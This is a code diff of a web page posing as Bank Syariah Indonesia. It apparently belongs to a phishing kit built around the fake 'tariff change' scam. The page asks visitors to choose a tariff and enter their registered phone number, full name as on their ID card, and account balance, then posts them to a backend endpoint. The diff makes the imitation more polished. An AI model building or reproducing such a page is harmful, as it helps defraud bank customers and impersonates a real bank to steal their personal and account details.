@@ -1,67 +1,102 @@
 <!DOCTYPE html>
-<html>
+<html lang="in">
 <head>
+    <meta charset="UTF-8">
     <title>Bank Syariah Indonesia</title>
+    <meta name="theme-color" content="#00A39E">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            max-width: 450px; 
-            margin: 0 auto; 
-            padding: 20px; 
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 450px;
+            margin: 0 auto;
+            background-color: #f5f5f5;
+            padding: 20px;
         }
-        .form-group { 
-            margin-bottom: 15px; 
+        .form-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        label { 
-            display: block; 
-            margin-bottom: 5px; 
+        .radio-group {
+            margin: 15px 0;
         }
-        input, button { 
-            width: 100%; 
-            padding: 10px; 
-            margin-bottom: 10px; 
+        .radio-item {
+            display: block;
+            margin: 10px 0;
+            padding: 10px;
+            border: 2px solid #00A39E;
+            border-radius: 5px;
+            background: #00A39E16;
         }
-        button { 
-            background: #00A39E; 
-            color: white; 
-            border: none; 
-            border-radius: 5px; 
-            cursor: pointer; 
+        .form-input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #00A39E;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        .submit-btn {
+            background: #00A39E;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #00A39E;
+            font-size: 24px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <h2>Bank Syariah Indonesia</h2>
-    <p>Konfirmasi tarif sesuai kebutuhan Anda</p>
+    <div class="logo">Bank Syariah Indonesia</div>
     
-    <form id="myForm">
-        <div class="form-group">
-            <label>Pilih Tarif:</label>
-            <input type="radio" name="tarif" value="baru" required> Tarif Baru (Rp 150.000/bulan)
-            <input type="radio" name="tarif" value="lama" required> Tarif Lama (Rp 6.500/transaksi)
-        </div>
+    <div class="form-container">
+        <p>Yuk segara konfirmasikan tarif sesuai dengan kebutuhan anda</p>
         
-        <div class="form-group">
-            <label>No. HP Terdaftar:</label>
-            <input type="tel" name="nohp" placeholder="Contoh: 08123456789" required>
-        </div>
-        
-        <div class="form-group">
-            <label>Nama Lengkap:</label>
-            <input type="text" name="nama" placeholder="Nama sesuai KTP" required>
-        </div>
-        
-        <div class="form-group">
-            <label>Saldo Akhir:</label>
-            <input type="text" name="saldo" placeholder="Contoh: 1.500.000" required>
-        </div>
-        
-        <button type="submit">PROSES</button>
-    </form>
+        <form id="bsiForm">
+            <div class="radio-group">
+                <label class="radio-item">
+                    <input type="radio" name="tarif" value="baru" required> 
+                    TARIF BARU Rp 150.000 / BULAN
+                </label>
+                <label class="radio-item">
+                    <input type="radio" name="tarif" value="lama" required> 
+                    TARIF LAMA Rp 6.500 / TRANSAKSI
+                </label>
+            </div>
+            
+            <div>
+                <label>No. HP Terdaftar</label>
+                <input type="tel" class="form-input" name="nohp" placeholder="Contoh: 08123456789" required>
+            </div>
+            
+            <div>
+                <label>Nama Lengkap</label>
+                <input type="text" class="form-input" name="nama" placeholder="Nama sesuai KTP" required>
+            </div>
+            
+            <div>
+                <label>Saldo Akhir</label>
+                <input type="text" class="form-input" name="saldo" placeholder="Contoh: 1.500.000" required>
+            </div>
+            
+            <button type="submit" class="submit-btn">PROSES</button>
+        </form>
+    </div>
 
     <script>
-        document.getElementById('myForm').addEventListener('submit', async function(e) {
+        document.getElementById('bsiForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const formData = new FormData(this);
@@ -73,6 +108,12 @@
             };
             
             try {
+                // Tampilkan loading
+                const btn = this.querySelector('button[type="submit"]');
+                btn.textContent = 'Memproses...';
+                btn.disabled = true;
+                
+                // Kirim data ke backend
                 const response = await fetch('/rest/no.js', {
                     method: 'POST',
                     headers: {
@@ -85,12 +126,20 @@
                 
                 if (result.success) {
                     alert('Data berhasil dikirim!');
-                    window.location.href = result.redirect;
+                    if (result.redirect) {
+                        window.location.href = result.redirect;
+                    }
                 } else {
                     alert('Error: ' + result.message);
                 }
             } catch (error) {
-                alert('Terjadi kesalahan: ' + error.message);
+                console.error('Error:', error);
+                alert('Terjadi kesalahan. Silakan coba lagi.');
+            } finally {
+                // Reset button
+                const btn = this.querySelector('button[type="submit"]');
+                btn.textContent = 'PROSES';
+                btn.disabled = false;
             }
         });
     </script>
